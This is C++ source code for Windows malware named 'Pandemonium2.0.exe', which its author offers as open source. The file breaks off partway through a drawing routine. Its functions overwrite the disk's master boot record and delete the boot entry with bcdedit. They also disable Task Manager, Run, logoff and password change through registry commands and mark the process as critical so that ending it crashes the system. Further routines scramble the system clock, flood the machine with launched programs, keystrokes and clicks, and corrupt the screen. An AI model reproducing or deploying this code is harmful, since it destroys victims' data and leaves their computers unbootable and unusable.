//Pandemonium2.0.exe malware
//if you use my code please credit
//IF YOU DONT CREDIT TO ME I WILL NOT MAKE AN OPEN SOURCE ANYMORE
//I didnt make it with Null_Y317K this time due her inactive.
#include <windows.h>
#include <tchar.h>
#include <ctime>
#include <iostream>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>
#include "BootHeader.h"
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
#define M_PI   3.14159265358979323846264338327950288
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) { //Credits to Void_/GetMBR
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}

DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
	return 1;
}
DWORD WINAPI Disabler(LPVOID lpParam) {
	system("taskkill /f /im taskmgr.exe");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
	system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
	system("bcdedit /delete {current}");
	return 1;
}
DWORD WINAPI notaskbar(LPVOID lpvd)
{
	static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
	ShowWindow(hShellWnd, SW_HIDE);
	return 666;
}
LPCWSTR  generateRandomUnicodeString(int len)
{
	wchar_t* ustr = new wchar_t[len + 1];      // +1 for '\0'

	for (int i = 0; i < len; i++) {
		ustr[i] = (rand() % 256) + 1024;
	}
	ustr[len] = L'\0';
	return ustr;
}
DWORD WINAPI textz(LPVOID lpParam) {

	while (true) {

		BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);

		EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
	}
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {

	SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)generateRandomUnicodeString(rand() % 10 + 10), SMTO_ABORTIFHUNG, 100, NULL);
	return true;

}

DWORD WINAPI Time(LPVOID lpstart) {
	while (true) {
		SYSTEMTIME st;
		st.wYear = rand() % 2300 + 1900;
		st.wMonth = rand() % 12 + 1;
		st.wDay = rand() % 28 + 1;
		st.wHour = rand() % 59 + 1;
		st.wMinute = rand() % 59 + 1;
		st.wSecond = rand() % 59 + 1;
		st.wMilliseconds = rand() % 59 + 1;

		SetSystemTime(&st);
		RtlZeroMemory(&st, sizeof(SYSTEMTIME));

		Sleep(rand() % 2000 + 700);
	}
}

DWORD WINAPI Programs(LPVOID lpstart) {
	WIN32_FIND_DATA data;
	LPCWSTR path = L"C:\\WINDOWS\\system32\\*.exe";

	while (true) {
		HANDLE find = FindFirstFileW(path, &data);

		ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);

		while (FindNextFileW(find, &data)) {
			ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
			Sleep(250);
		}
	}
}


DWORD WINAPI Buttons(LPVOID lpstart) {
	while (true) {
		HWND hwnd = GetForegroundWindow();

		EnableMenuItem(GetSystemMenu(hwnd, 0), SC_CLOSE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);

		SetWindowLongA(hwnd, GWL_STYLE, GetWindowLongA(hwnd, GWL_STYLE) & ~WS_MINIMIZEBOX);

		SetWindowLongA(hwnd, GWL_STYLE, GetWindowLongA(hwnd, GWL_STYLE) & ~WS_MAXIMIZEBOX);
		Sleep(10);
	}
}

DWORD WINAPI SendKeys(LPVOID lpstart) {
	const char alphanum[] = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ$#@&!?._-";
	int nKey = sizeof(alphanum) / sizeof(void *);

	INPUT input;
	input.type = INPUT_KEYBOARD;

	while (true) {
		input.ki.wVk = VkKeyScanA(rand() % nKey);

		SendInput(1, &input, sizeof(INPUT));
		RtlZeroMemory(&input, sizeof(input));

		Sleep(rand() % 50 + 30);
	}
}

DWORD WINAPI Click(LPVOID lpstart) {
	INPUT input;
	input.type = INPUT_MOUSE;

	while (true) {
		input.mi.dwFlags = (rand() % 2) ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_RIGHTUP;

		SendInput(1, &input, sizeof(INPUT));
		RtlZeroMemory(&input, sizeof(input));

		Sleep(rand() % 70 + 50);
	}
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}


BOOL CALLBACK MoveWindowCallback(HWND hwnd, LPARAM lParam) {
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	// Skip invisible or minimized windows
	if (!IsWindowVisible(hwnd) || IsIconic(hwnd)) {
		return TRUE;
	}

	// Randomize position
	int newX = rand() % screenWidth;
	int newY = rand() % screenHeight;

	// Randomize size
	int newWidth = (rand() % (screenWidth / 2)) + 100;  // Width between 100 and half of the screen width
	int newHeight = (rand() % (screenHeight / 2)) + 100;  // Height between 100 and half of the screen height

														  // Move and resize the window without activating it
	SetWindowPos(hwnd, HWND_TOP, newX, newY, newWidth, newHeight, SWP_NOACTIVATE | SWP_NOREDRAW);

	return TRUE; // Continue enumerating windows
}

DWORD WINAPI window(LPVOID lpParam) {
	srand((unsigned)time(NULL));

	while (true) {
		// Enumerate all windows and move them
		EnumWindows(MoveWindowCallback, 0);

		// Small delay to avoid overwhelming the system
		Sleep(10000);
	}

	return 0;
}

DWORD WINAPI window2(LPVOID lpParam) {
	srand((unsigned)time(NULL));

	while (true) {
		// Enumerate all windows and move them
		EnumWindows(MoveWindowCallback, 0);

		// Small delay to avoid overwhelming the system
		Sleep(10000);
	}

	return 0;
}
DWORD WINAPI mouse(LPVOID lpParam) {
	POINT cursor;
	while (1) {
		INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		int X = rand() % w;
		int Y = rand() % h;
		SetCursorPos(X, Y);
		Sleep(1000);
	}
}

DWORD WINAPI shader1(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0);
	HDC hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(SM_CXSCREEN);
	INT h = GetSystemMetrics(SM_CYSCREEN);

	// Create a compatible bitmap to use for drawing
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = -h; // Negative height to make the bitmap top-down
	bmi.bmiHeader.biCompression = BI_RGB;

	// Create a bitmap section and select it into the device context
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, NULL, NULL, 0);
	HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMem, hbmTemp);

	// Use a pen to fill the screen with color
	HBRUSH hBrushWhite = CreateSolidBrush(RGB(255, 255, 255));
	HBRUSH hBrushBlack = CreateSolidBrush(RGB(0, 0, 0));

	bool flashWhite = true;
	while (true) {
		// Fill the screen with the current color
		HBRUSH hBrush = flashWhite ? hBrushWhite : hBrushBlack;
		FillRect(hdcMem, &RECT{ 0, 0, w, h }, hBrush);

		// Copy the bitmap to the screen
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);

		// Toggle the color and sleep
		flashWhite = !flashWhite;
		Sleep(1000); // Adjust the time to control the flash speed

					 // Clean up
		DeleteObject(hBrush);
	}

	// Clean up resources (though this line will never be reached)
	SelectObject(hdcMem, hbmOld);
	DeleteObject(hbmTemp);
	DeleteObject(hBrushWhite);
	DeleteObject(hBrushBlack);
	DeleteDC(hdcMem);
	ReleaseDC(0, hdcScreen);

	return 0;
}

DWORD WINAPI shader2(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = -h; // Negative height to make the bitmap top-down
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	int offsetY = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				// Generate a grayscale value based on position and offset
				BYTE gray = (BYTE)(255 * ((x + y + offsetY) % 256) / 255);

				// Set the RGBQUAD to the grayscale value
				rgbquad[index].rgbRed = gray;
				rgbquad[index].rgbGreen = gray;
				rgbquad[index].rgbBlue = gray;
			}
		}

		// Copy the bitmap to the screen
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);

		// Release the device context
		ReleaseDC(NULL, hdc);

		// Update the offset to move the pattern downward
		offsetY += 2; // Adjust the value to control the speed of movement

					  // Ensure offset wraps around to avoid excessive scrolling
		if (offsetY >= h) {
			offsetY = 0;
		}

		// Delay to control the update rate
		Sleep(10);
	}

	// Clean up resources (though this line will never be reached)
	DeleteDC(hdcCopy);
	DeleteObject(bmp);

	return 0x00;
}

DWORD WINAPI shader3(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = -screenHeight; // Use negative height to get the correct top-down orientation
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	int i = 0;
	while (1) {
		// Capture the current screen image
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		// Apply the rainbow effect
		for (int y = 0; y < screenHeight; y++) {
			for (int x = 0; x < screenWidth; x++) {
				int index = y * screenWidth + x;

				// Convert RGB to HSL
				HSL hslcolor = Colors::rgb2hsl(rgbquad[index]);

				// Modify the hue to create a rainbow scrolling effect
				hslcolor.h = fmod((i * 0.01f + y / (float)screenHeight), 1.0f);

				// Convert HSL back to RGB
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		// Increment to create scrolling effect
		i++;

		// Draw the modified image back to the screen
		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);

		Sleep(10);  // Add a slight delay to control the speed of the effect
	}

	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	ReleaseDC(NULL, hdc);

	return 0;
}

DWORD WINAPI plgblt(LPVOID lpParam)
{
	HDC hdc = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		hdc = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + 120;
		wPt[0].y = wRect.top - 0;
		wPt[1].x = wRect.right + 0;
		wPt[1].y = wRect.top + 120;
		wPt[2].x = wRect.left - 0;
		wPt[2].y = wRect.bottom + 120;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right + wRect.left, wRect.bottom + wRect.top, 0, 0, 0);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shader4(LPVOID lpParam) {
	HDC desk = GetDC(0);  // Get desktop device context
	HWND wnd = GetDesktopWindow();  // Get handle to the desktop window
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);  // Screen width and height
	BITMAPINFO bmi = { sizeof(BITMAPINFOHEADER), sw, -sh, 1, 24, BI_RGB, 0, 0, 0, 0, 0 };  // Bitmap header
	PRGBTRIPLE rgbtriple;

	// Setup colors for rainbow effect
	const int numColors = 6;
	COLORREF rainbowColors[numColors] = { RGB(255, 0, 0), RGB(255, 127, 0), RGB(255, 255, 0), RGB(0, 255, 0), RGB(0, 0, 255), RGB(75, 0, 130) };

	int offsetX = 0;  // Initial horizontal movement offset
	int offsetY = 0;  // Initial vertical movement offset

	for (int frame = 0;; frame += 25) {
		HDC deskMem = CreateCompatibleDC(desk);  // Create memory device context
		HBITMAP scr = CreateDIBSection(desk, &bmi, DIB_RGB_COLORS, (void**)&rgbtriple, 0, 0);  // Create bitmap
		SelectObject(deskMem, scr);
		BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);  // Copy desktop screen content

															 // Apply the XOR fractal and rainbow effect
		for (int i = 0; i < sw * sh; i++) {
			int x = i % sw, y = i / sw;
			int t = (x ^ y) + frame;  // XOR fractal effect with movement

									  // Rainbow effect cycling based on the t value
			int colorIndex = (t / 50) % numColors;
			rgbtriple[i].rgbtRed = GetRValue(rainbowColors[colorIndex]);
			rgbtriple[i].rgbtGreen = GetGValue(rainbowColors[colorIndex]);
			rgbtriple[i].rgbtBlue = GetBValue(rainbowColors[colorIndex]);
		}

		// Update the position to move content forward (up-left)
		offsetX = (frame / 10) % sw;  // Adjust for smooth movement in X direction
		offsetY = (frame / 10) % sh;  // Adjust for smooth movement in Y direction

									  // Wrap the content to stay on screen (wrap horizontally and vertically)
		if (offsetX != 0 || offsetY != 0) {
			BitBlt(desk, 0, 0, sw - offsetX, sh - offsetY, deskMem, offsetX, offsetY, SRCCOPY);  // Copy the portion that remains visible
			BitBlt(desk, sw - offsetX, 0, offsetX, sh - offsetY, deskMem, 0, offsetY, SRCCOPY);  // Wrap horizontally
			BitBlt(desk, 0, sh - offsetY, sw - offsetX, offsetY, deskMem, offsetX, 0, SRCCOPY);  // Wrap vertically
			BitBlt(desk, sw - offsetX, sh - offsetY, offsetX, offsetY, deskMem, 0, 0, SRCCOPY);  // Wrap both horizontally and vertically
		}

		// Cleanup
		DeleteObject(scr);
		DeleteDC(deskMem);

		// Delay for next frame
		Sleep(10);  // Adjust the speed of movement (higher values slow it down)
	}

	ReleaseDC(wnd, desk);  // Release desktop device context
	return 0;
}

DWORD WINAPI shader5(LPVOID lpParam) {
	HDC desk = GetDC(0);  // Get desktop device context
	HWND wnd = GetDesktopWindow();  // Get handle to the desktop window
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);  // Screen width and height
	BITMAPINFO bmi = { sizeof(BITMAPINFOHEADER), sw, -sh, 1, 24, BI_RGB, 0, 0, 0, 0, 0 };  // Bitmap header
	PRGBTRIPLE rgbtriple;

	int offsetX = 0;  // Initial horizontal movement offset
	int offsetY = 0;  // Initial vertical movement offset

	for (int frame = 0;; frame += 25) {
		HDC deskMem = CreateCompatibleDC(desk);  // Create memory device context
		HBITMAP scr = CreateDIBSection(desk, &bmi, DIB_RGB_COLORS, (void**)&rgbtriple, 0, 0);  // Create bitmap
		SelectObject(deskMem, scr);
		BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);  // Copy desktop screen content

															 // Apply the XOR fractal with black and white effect
		for (int i = 0; i < sw * sh; i++) {
			int x = i % sw, y = i / sw;
			int t = (x ^ y) + frame;  // XOR fractal effect with movement

									  // Set to white or black based on a threshold
			if (t % 100 < 50) {
				rgbtriple[i].rgbtRed = 255;
				rgbtriple[i].rgbtGreen = 255;
				rgbtriple[i].rgbtBlue = 255;
			}
			else {
				rgbtriple[i].rgbtRed = 0;
				rgbtriple[i].rgbtGreen = 0;
				rgbtriple[i].rgbtBlue = 0;
			}
		}

		// Update the position to move content forward (up-left)
		offsetX = (frame / 10) % sw;  // Adjust for smooth movement in X direction
		offsetY = (frame / 10) % sh;  // Adjust for smooth movement in Y direction

									  // Wrap the content to stay on screen (wrap horizontally and vertically)
		if (offsetX != 0 || offsetY != 0) {
			BitBlt(desk, 0, 0, sw - offsetX, sh - offsetY, deskMem, offsetX, offsetY, SRCCOPY);  // Copy the portion that remains visible
			BitBlt(desk, sw - offsetX, 0, offsetX, sh - offsetY, deskMem, 0, offsetY, SRCCOPY);  // Wrap horizontally
			BitBlt(desk, 0, sh - offsetY, sw - offsetX, offsetY, deskMem, offsetX, 0, SRCCOPY);  // Wrap vertically
			BitBlt(desk, sw - offsetX, sh - offsetY, offsetX, offsetY, deskMem, 0, 0, SRCCOPY);  // Wrap both horizontally and vertically
		}

		// Cleanup
		DeleteObject(scr);
		DeleteDC(deskMem);

		// Delay for next frame
		Sleep(10);  // Adjust the speed of movement (higher values slow it down)
	}

	ReleaseDC(wnd, desk);  // Release desktop device context
	return 0;
}

DWORD WINAPI shader6(LPVOID lpParam) {
	int time = GetTickCount();
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);

		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 60000)
			byte = rand() % 0xff;

		for (int i = 0; w * h > i; i++) {
			int x = i % w, y = i / h;
			if (i % h == 0 && rand() % 100 == 0)
				v = rand() % 1000;

			// Generate a rainbow color
			int t = (x ^ y) + byte;  // XOR fractal effect with optional random byte
			BYTE red = (BYTE)(sin(0.1 * t + 0) * 127 + 128);
			BYTE green = (BYTE)(sin(0.1 * t + 2) * 127 + 128);
			BYTE blue = (BYTE)(sin(0.1 * t + 4) * 127 + 128);

			data[i].rgbRed = red;
			data[i].rgbGreen = green;
			data[i].rgbBlue = blue;
		}

		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		DeleteObject(hbm);
		DeleteDC(hdcdc);
		ReleaseDC(NULL, desk);
	}

	return 0;
}

DWORD WINAPI sines1(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;

	for (;;) {
		hdc = GetDC(0);
		for (float i = sh; i > 0; i -= 0.99f) {  // Loop from bottom to top
			int a = sin(angle) * 60;  // Calculate the sine offset
			BitBlt(hdc, a, i, sw, 1, hdc, 0, i - 1, SRCCOPY);  // Move pixels upward
			angle += M_PI / 70;
		}
		ReleaseDC(wnd, hdc);
		InvalidateRect(0, 0, 0);
	}
}

void Draw3DCube(HDC hdc, int x, int y, int size, int depth) {
	// Create brushes for different faces
	HBRUSH frontBrush = CreateSolidBrush(RGB(0, 0, 255));   // Blue for front face
	HBRUSH topBrush = CreateSolidBrush(RGB(0, 255, 0));     // Green for top face
	HBRUSH sideBrush = CreateSolidBrush(RGB(255, 0, 0));    // Red for side face

															// Draw front face
	SelectObject(hdc, frontBrush);
	Rectangle(hdc, x, y, x + size, y + size);

	// Draw top face
	POINT topFace[4] = {
		{ x, y },
		{ x + depth, y - depth },
		{ x + size + depth, y - depth },
		{ x + size, y }
	};
	SelectObject(hdc, topBrush);
	Polygon(hdc, topFace, 4);

	// Draw right face
	POINT rightFace[4] = {
		{ x + size, y },
		{ x + size + depth, y - depth },
		{ x + size + depth, y + size - depth },
		{ x + size, y + size }
	};
	SelectObject(hdc, sideBrush);
	Polygon(hdc, rightFace, 4);

	// Draw left face (optional - for a more complex 3D effect)
	POINT leftFace[4] = {
		{ x, y },
		{ x + depth, y - depth },
		{ x + depth, y + size - depth },
		{ x, y + size }
	};
	SelectObject(hdc, sideBrush);
	Polygon(hdc, leftFace, 4);

	// Draw edges (optional - for enhancing the 3D appearance)
	MoveToEx(hdc, x, y, NULL);
	LineTo(hdc, x + depth, y - depth);
	LineTo(hdc, x + size + depth, y - depth);
	LineTo(hdc, x + size, y);

	MoveToEx(hdc, x + size, y, NULL);
	LineTo(hdc, x + size + depth, y - depth);
	LineTo(hdc, x + size + depth, y + size - depth);
	LineTo(hdc, x + size, y + size);

	// Clean up
	DeleteObject(frontBrush);
	DeleteObject(topBrush);
	DeleteObject(sideBrush);
}

DWORD WINAPI cube(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (1) {
		HDC hdc = GetDC(0);
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 100 + x;
		int bottom_y = 100 + y;
		x += incrementor * signX;
		y += incrementor * signY;

		//Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);
		Draw3DCube(hdc, x, y, 100, 50);


		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(10);
		//InvalidateRect(0, 0, 0);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI pixelate(LPVOID lpvd)
{
	HDC hdc = GetDC(0);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);

	while (1)
	{
		hdc = GetDC(0);
		SetStretchBltMode(hdcCopy, COLORONCOLOR);
		SetStretchBltMode(hdc, COLORONCOLOR);

		StretchBlt(hdcCopy, 0, 0, w / 15, h / 15, hdc, 0, 0, w, h, SRCCOPY);
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w / 15, h / 15, SRCCOPY);

		//if (rand() % 5 == 4) StretchBlt(hdc, 1, 1, w, h, hdc, 0, 0, w, h, SRCAND);
		ReleaseDC(0, hdc);
		Sleep(10);
	}

	return 0x00;
}

DWORD WINAPI gradientfilltriangle(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	while (1) {
		hdc = GetDC(NULL);
		// Create an array of TRIVERTEX structures that describe
		// positional and color values for each vertex.
		TRIVERTEX vertex[3];

		// Vertex 1 - Red
		vertex[0].x = rand() % w;
		vertex[0].y = rand() % h;
		vertex[0].Red = 0xFF00;   // Full red
		vertex[0].Green = 0x0000; // No green
		vertex[0].Blue = 0x0000;  // No blue
		vertex[0].Alpha = 0x0000;

		// Vertex 2 - Green
		vertex[1].x = rand() % w;
		vertex[1].y = rand() % h;
		vertex[1].Red = 0x0000;   // No red
		vertex[1].Green = 0xFF00; // Full green
		vertex[1].Blue = 0x0000;  // No blue
		vertex[1].Alpha = 0x0000;

		// Vertex 3 - Blue
		vertex[2].x = rand() % w;
		vertex[2].y = rand() % h;
		vertex[2].Red = 0x0000;   // No red
		vertex[2].Green = 0x0000; // No green
		vertex[2].Blue = 0xFF00;  // Full blue
		vertex[2].Alpha = 0x0000;

